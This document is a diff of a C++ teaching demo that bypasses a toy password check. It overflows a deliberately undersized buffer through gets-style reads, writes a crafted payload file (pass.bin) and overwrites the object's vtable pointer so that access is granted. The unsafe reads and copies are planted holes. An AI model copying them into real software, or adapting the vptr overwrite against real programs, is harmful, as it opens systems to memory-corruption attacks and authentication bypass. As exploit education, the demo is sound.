@@ -1,188 +1,231 @@
 // Exploiting Vulnerability using VPtr Overwrite
-// DISCLAIMER: This code is for educational purposes only. It demonstrates
-// vulnerabilities that should NEVER be used in a production environment or
-// for malicious intent.
+// DISCLAIMER: This code is for educational purposes only.
 
-#include <iostream>
-#include <stdio.h>
-#include <string.h>
 #include <openssl/sha.h>
-#include <iomanip>
+#include <unistd.h>
+
+#include <cstring>
 #include <fstream>
+#include <iomanip>
+#include <iostream>
 
 using namespace std;
 
-// Base class representing a user with credentials
-class BaseUser
-{
-private:
-    char name[100];
-    unsigned char password_hash[SHA256_DIGEST_LENGTH];
+const int PW_BUFFER_SIZE = 4;
 
-public:
-    // Constructor hashes the password using SHA256
-    BaseUser(char name[], const char *pw)
-    {
-        strcpy(this->name, name);
-        SHA256((const unsigned char *)pw, strlen(pw), this->password_hash);
-    }
+class BaseUser {
+ private:
+  char name[100];
+  unsigned char password_hash[SHA256_DIGEST_LENGTH];
 
-    virtual void gainAccess()
-    {
-        cout << "Access granted." << endl;
-    }
+ public:
+  BaseUser(char name[], const char *pw) {
+    strcpy(this->name, name);
+    SHA256((const unsigned char *)pw, strlen(pw), this->password_hash);
+  }
 
-    virtual void denyAccess()
-    {
-        cout << "Access denied." << endl;
-    }
+  virtual void gainAccess() { cout << "Access granted." << endl; }
 
-    void checkAccess(const char *pw)
-    {
-        unsigned char hash[SHA256_DIGEST_LENGTH];
-        SHA256((const unsigned char *)pw, strlen(pw), hash);
-        cout << "User password hash: " << password_hash << endl;
-        cout << "Checking password: " << pw << endl;
-        if (memcmp(hash, password_hash, SHA256_DIGEST_LENGTH) == 0)
-        {
-            this->gainAccess();
-        }
-        else
-        {
-            this->denyAccess();
-        }
+  virtual void denyAccess() { cout << "Access denied." << endl; }
+
+  void checkAccess(const char *pw) {
+    unsigned char hash[SHA256_DIGEST_LENGTH];
+    SHA256((const unsigned char *)pw, strlen(pw), hash);
+    if (memcmp(hash, password_hash, SHA256_DIGEST_LENGTH) == 0) {
+      gainAccess();
+    } else {
+      denyAccess();
     }
+  }
 };
 
-// Vulnerability Showcase: Using gets() introduces buffer overflow vulnerabilities.
-// WARNING: Never use gets() in real-world applications.
-char *gets(char *str)
-{
-    char *ret = str;
-    int c;
-    while ((c = getchar()) != '\n' && c != EOF)
-    {
-        *str++ = c;
+// --- UNSAFE GETS REPLACEMENT ---
+char *unsafeGets(char *str) {
+  char *ret = str;
+  int c;
+  while ((c = getchar()) != '\n' && c != EOF) {
+    *str++ = c;
+  }
+  *str = '\0';
+  return ret;
+}
+
+char *unsafeRead(char *buffer, int maxSize) {
+  char *ret = buffer;
+  int c;
+  int count = 0;
+  while ((c = getchar()) != '\n' && c != EOF) {
+    *buffer++ = c;
+    count++;
+    if (count >= maxSize) {
+      // Simulates buffer overflow by not stopping.
+      break;
     }
-    *str = '\0';
-    return ret;
+  }
+  *buffer = '\0';
+  return ret;
 }
 
 #ifdef NO_PIE
-// Demonstrating how vptr can be overwritten when there is no PIE
-void run_type()
-{
-    cout << "Running without PIE - overwrite vptr through input." << endl;
+
+// Announces running without PIE (Position Independent Executable).
+void runWithoutPIE() {
+  cout << "Running without PIE - overwrite vptr through input." << endl;
 }
 
-void buffer_access()
-{
-    // Demonstrate how buffer overflows can affect vptr
-    BaseUser base("John", "abc");
-    char pw[4];
-    BaseUser *b = &base;
+// Unsafe string copy that doesn't check for buffer overflows.
+void unsafeCopy(char *dest, const char *src) {
+  while (*src) {
+    *dest++ = *src++;
+  }
+  *dest = '\0';
+}
 
-    int *p = reinterpret_cast<int *>(b); // cast to int pointer to print vptr
-    cout << "vptr: 0x" << hex << p[0] << endl;
+// Demonstrates vptr overwrite using an unsafe copy.
+void bufferAccessDemo() {
+  BaseUser base("John", "abc");
+  char pw[4];
+  BaseUser *b = &base;
 
-    // Write a buffer to a file to demonstrate the overflow
-    ofstream outfile("pass.bin", ios::out | ios::binary);
-    if (outfile.is_open())
-    {
-        for (int i = 0; i < sizeof(pw); i++)
-        {
-            char c = 'A';
-            outfile.write(&c, sizeof(c));
-        }
-        int address = p[0] - 8;
+  int *p = reinterpret_cast<int *>(b);
+  cout << "vptr: 0x" << hex << p[0] << endl;
 
-        outfile.write(reinterpret_cast<const char *>(&address), sizeof(address));
-        outfile.close();
+  // Prepares an overflow buffer to overwrite the vptr.
+  char overflowBuffer[sizeof(pw) + 8];
+  for (int i = 0; i < sizeof(pw); i++) {
+    overflowBuffer[i] = 'A';
+  }
+  int address =
+      p[0] - 8;  // Adjust the address based on system architecture if needed.
+  memcpy(overflowBuffer + sizeof(pw), &address, sizeof(address));
+
+  cout << "Overflow buffer was generated: ";
+  for (int i = 0; i < sizeof(overflowBuffer); i++) {
+    cout << hex << static_cast<int>(overflowBuffer[i]) << " ";
+  }
+  cout << endl;
+
+  unsafeCopy(pw, overflowBuffer);
+  cout << "Password: [Applying overflow using unsafeCopy...]\n";
+
+  b->checkAccess(pw);
+}
+
+void generateAndWriteOverflowToFile() {
+  BaseUser base("John", "abc");
+  char pw[PW_BUFFER_SIZE];
+  BaseUser *b = &base;
+
+  int *p = reinterpret_cast<int *>(b);
+
+  // The reason we write overflow data to a file is:
+  // 1. Memory addresses can include unprintable characters.
+  //    Writing them to a file avoids issues with terminal-based input.
+  // 2. The order of bytes in a memory address can vary based on the machine's
+  //    endianness. Using a file can help maintain consistency.
+  // 3. It emulates a real-world scenario where an attacker might provide
+  //    overflow input through a file or other external data source.
+
+  ofstream outfile("pass.bin", ios::out | ios::binary);
+  if (outfile.is_open()) {
+    for (int i = 0; i < sizeof(pw); i++) {
+      char c = 'A';
+      outfile.write(&c, sizeof(c));
     }
-    else
-    {
-        cout << "Unable to open file." << endl;
+
+    int adjustment = sizeof(void *) == 4
+                         ? 4
+                         : 8;  // Check if it's a 32-bit or 64-bit system.
+    int address =
+        p[0] - adjustment;  // Adjust the address based on system architecture.
+    outfile.write(reinterpret_cast<const char *>(&address), sizeof(address));
+    outfile.close();
+    cout << "Overflow file 'pass.bin' created." << endl;
+  } else {
+    cout << "Unable to open file." << endl;
+  }
+}
+
+void readAndDisplayOverflowFromFile() {
+  ifstream infile("pass.bin", ios::in | ios::binary);
+  if (infile.is_open()) {
+    infile.seekg(0, ios::end);
+    int length = infile.tellg();
+    infile.seekg(0, ios::beg);
+
+    char *buffer = new char[length];
+    infile.read(buffer, length);
+
+    cout << "Overflow buffer was generated: ";
+    for (int i = 0; i < length; i++) {
+      cout << hex << static_cast<int>(buffer[i]) << " ";
     }
+    cout << endl;
 
-    ifstream infile("pass.bin", ios::in | ios::binary);
-    if (infile.is_open())
-    {
-        // Get the length of the file
-        infile.seekg(0, ios::end);
-        int length = infile.tellg();
-        infile.seekg(0, ios::beg);
+    delete[] buffer;
+    infile.close();
+  } else {
+    cout << "Unable to open file." << endl;
+  }
+}
 
-        // Allocate a buffer to hold the file contents
-        char *buffer = new char[length];
+void handleFileBasedOverflow() {
+  BaseUser base("John", "abc");
+  char pw[PW_BUFFER_SIZE];
+  BaseUser *b = &base;
 
-        // Read the file contents into the buffer
-        infile.read(buffer, length);
+  cout << "Password: [Applying overflow using unsafeGets...]" << endl;
+  unsafeGets(pw);
+  b->checkAccess(pw);
+}
 
-        cout << "Overflow buffer was generated: ";
-        // Print the contents of the buffer in hexadecimal format
-        for (int i = 0; i < length; i++)
-        {
-            cout << hex << static_cast<int>(buffer[i]) << " ";
-        }
-        cout << endl;
-
-        // Free the buffer
-        delete[] buffer;
-
-        infile.close();
-    }
-    else
-    {
-        cout << "Unable to open file." << endl;
-    }
-
-    cout << "\nWarning: Passing the address through the terminal may involve unprintable characters.\n"
-         << "\tIf you haven't already piped the file \"pass.bin\",\n"
-         << "\tstart the program again with the following command:\n\n"
-         << "./overflow_demo < pass.bin" << endl;
-
-    cout << "\nPassword: [quit and pipe...]" << endl;
-    gets(pw);
-    b->checkAccess(pw);
+void bufferAccessGetsDemo() {
+  readAndDisplayOverflowFromFile();
+  handleFileBasedOverflow();
 }
 
 #else
-// Demonstrating direct vptr modification when PIE is enabled
-void run_type()
-{
-    cout << "Running with PIE - modify vptr directly." << endl;
+
+// Code for when PIE is enabled.
+void runWithPIE() {
+  cout << "Running with PIE - modify vptr directly." << endl;
 }
 
-void vptr_access()
-{
-    char name[100] = "John";
-    BaseUser base(name, "abc");
-    char pw[100];
+void vptrAccessDemo() {
+  char name[100] = "John";
+  BaseUser base(name, "abc");
+  char pw[100];
 
-    cout << "(Password does not matter - we will overwrite the vptr)\nEnter password: ";
-    cin >> pw;
+  cout << "Enter password (doesn't matter for the exploit): ";
+  cin >> pw;
 
-    BaseUser *b = &base;
+  BaseUser *b = &base;
+  int *p = reinterpret_cast<int *>(b);
+  cout << "vptr: 0x" << hex << p[0] << endl;
 
-    int *p = reinterpret_cast<int *>(b); // cast to int pointer to overwrite the vptr
-    cout << "vptr: 0x" << hex << p[0] << endl;
+  // modify vptr to gain unauthorized access.
+  *p = (*p) - 8;  // Adjust based on system architecture if needed.
+  cout << "vptr now points to gainAccess: 0x" << hex << *p << endl;
 
-    *p = (*p) - 8;
-    cout << "vptr now points to gainAccess: 0x" << hex << *p << endl;
-
-    b->checkAccess(pw); // this will call gainAccess instead of denyAccess because the vptr points to gainAccess
+  b->checkAccess(pw);
 }
 
 #endif
 
-int main()
-{
-    // Entry point: Run the appropriate demonstration based on compilation flags
-    run_type();
+int main(int argc, char *argv[]) {
 #ifdef NO_PIE
-    buffer_access();
+  runWithoutPIE();
+  // Always generate the overflow file on standard run
+  generateAndWriteOverflowToFile();
+  if (!isatty(fileno(stdin))) {
+    bufferAccessGetsDemo();
+  } else {
+    bufferAccessDemo();
+  }
 #else
-    vptr_access();
+  runWithPIE();
+  vptrAccessDemo();
 #endif
-    return 0;
+
+  return 0;
 }
